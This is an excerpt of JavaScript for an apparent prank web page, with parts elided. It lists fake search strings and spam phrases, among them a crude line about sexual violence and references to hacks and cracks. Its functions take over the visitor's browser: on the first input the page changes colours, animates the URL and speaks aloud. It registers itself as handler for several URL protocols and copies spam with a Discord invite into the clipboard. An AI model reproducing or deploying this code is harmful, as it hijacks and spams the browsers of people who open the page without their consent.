...
const SEARCHES = [
  'BABY GIRL',
  'Rabvixchug executable',
  'why is my chili purple',
  'HACKSCRIPT PACK 2025',
  'Hackschools near me',
  'Gugginflow hack',
  'FRED HIGGINFLOW',
  'Inquirign miko zdravkovski',
  'lupmlg77 raping my mom',
  'HARKINIAN WHERE TO CONTACT',
  'Solario hacking incident fe bypass',
  'rabbid chung 50 cr9ck',
  'why did i fall to my knees upon seeing rabbichug 50',
  'RABBIT CHUNG MOD CRACK 50',
...
const PHRASES = [
  'Gjadis',
  'GLADIUS ROMANUS BELISARIUS',
  'Rabbit chungauri 50!',
  'My best hacking so far!',
  'Gigginluas',
  'https://discord.gg/Ae8zkNCNBh',
  'full lua',
  'Hackuation.ru'
]
...
function initParentWindow () {
  ...
  interceptUserInput(event => {
    ...
    if (interactionCount === 1) {
      ...
      rainbowThemeColor()
      animateUrlWithEmojis()
      speak('HAHAHA RABBIT CHUNG 50 LOADING')
    }
  })
}
...
function registerProtocolHandlers () {
  ...
  protocolWhitelist.forEach(proto => {
    navigator.registerProtocolHandler(proto, handlerUrl, 'Rabbid Chung 50')
  })
}
...
function copySpamToClipboard () {
  const randomArt = getRandomArrayEntry(ART) + '\nCheck out https://discord.gg/Ae8zkNCNBh'
